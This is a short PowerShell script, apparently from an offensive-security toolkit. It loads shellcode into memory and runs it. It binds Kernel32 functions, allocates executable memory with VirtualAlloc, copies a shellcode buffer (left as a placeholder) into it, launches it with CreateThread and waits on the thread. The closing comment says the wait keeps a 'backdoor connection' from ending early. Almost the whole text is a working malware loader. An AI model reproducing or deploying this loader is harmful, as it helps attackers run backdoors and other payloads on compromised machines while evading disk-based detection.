$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); 
}
"@

Add-Type $Kernel32

[Byte[]] $buf = <SHELLCODE>

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")

# IN SUMMARY; This code acts like ShellCodeLauncher.ps1 with the difference that adds the WaitForSingleObject that waits for the termination of the shellcode subprocess to terminate before to terminate current powershell process in order to avoid the backdoor connection to be terminated early than expected.